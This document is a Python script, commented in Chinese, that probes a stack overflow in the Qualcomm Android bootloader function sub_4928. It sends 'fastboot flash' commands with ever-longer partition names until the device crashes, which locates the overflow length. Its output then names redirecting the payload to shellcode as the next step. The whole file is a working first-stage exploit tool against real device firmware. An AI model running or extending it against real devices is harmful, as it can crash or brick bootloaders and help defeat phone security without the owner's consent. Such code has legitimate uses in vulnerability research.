import subprocess
import time
import sys

# 准备一个小的 dummy 文件，用于触发 flash 命令
with open("probe.img", "wb") as f:
    f.write(b"\x00" * 1024)

def test_length(length):
    # 构造探测用的分区名
    # ABL sub_4928 会将其转为 Unicode
    malicious_name = "A" * length

    print(f"[*] Testing length: {length} chars ({length*2} bytes)...", end='', flush=True)

    try:
        # 执行命令：fastboot flash <长名称> probe.img
        # 我们设置 3 秒超时，因为崩溃会导致连接超时
        proc = subprocess.run(
            ["fastboot", "flash", malicious_name, "probe.img"],
            capture_output=True,
            text=True,
            timeout=4
        )

        # 如果返回了 "Partition not found"，说明程序还在正常运行（权限检查生效了）
        if "not found" in proc.stderr or "Partition" in proc.stderr:
            print(" [SAFE: Logic Intact]")
            return True
        else:
            print(f" [REPORT: {proc.stderr.strip()}]")
            return True

    except subprocess.TimeoutExpired:
        print("\n[!] CRASH DETECTED! (Timeout)")
        print(f"[!] The magic length is likely near {length} characters.")
        return False
    except Exception as e:
        print(f"\n[!] Error or Disconnect: {e}")
        return False

if __name__ == "__main__":
    print("--- Qualcomm ABL Stack Overflow Prober ---")
    print("[*] Target Function: sub_4928 (0x4928)")
    print("[*] Expected crash range: 130 - 160 characters")

    # 开始步进测试
    # 我们从 120 开始，因为 296/2 = 148，120 刚好在边缘
    for l in range(120, 200, 2):
        if not test_length(l):
            print("\n[+] Step Probing Finished.")
            print("[+] Next Step: Adjust payload to point to Shellcode.")
            sys.exit(0)
        time.sleep(0.5)

    print("\n[-] No crash detected in range. Try increasing the limit.")
